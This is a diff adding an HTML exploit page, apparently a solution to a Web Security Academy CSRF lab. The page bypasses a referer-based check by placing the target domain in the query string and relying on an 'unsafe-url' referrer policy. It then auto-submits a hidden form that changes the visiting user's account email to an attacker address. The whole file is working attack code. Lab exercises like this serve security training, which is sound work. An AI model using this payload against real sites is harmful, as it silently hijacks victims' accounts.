@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- Ensure Referrer-Policy: unsafe-url is set as HTTP header on exploit server -->
+</head>
+<body>
+    <script>
+        // Check if we need to add the target domain to URL
+        if (!window.location.href.includes('0a9d00a00374d7d882c0659700670057.web-security-academy.net')) {
+            // Redirect with target domain in query string
+            window.location = window.location.pathname + '?0a9d00a00374d7d882c0659700670057.web-security-academy.net';
+        } else {
+            // Create and submit form after URL contains domain
+            document.write(`
+                <form method="POST" action="https://0a9d00a00374d7d882c0659700670057.web-security-academy.net/my-account/change-email" id="csrf-form">
+                    <input type="hidden" name="email" value="pwned@evil-hacker.net">
+                </form>
+            `);
+            document.getElementById('csrf-form').submit();
+        }
+    </script>
+</body>
+</html>
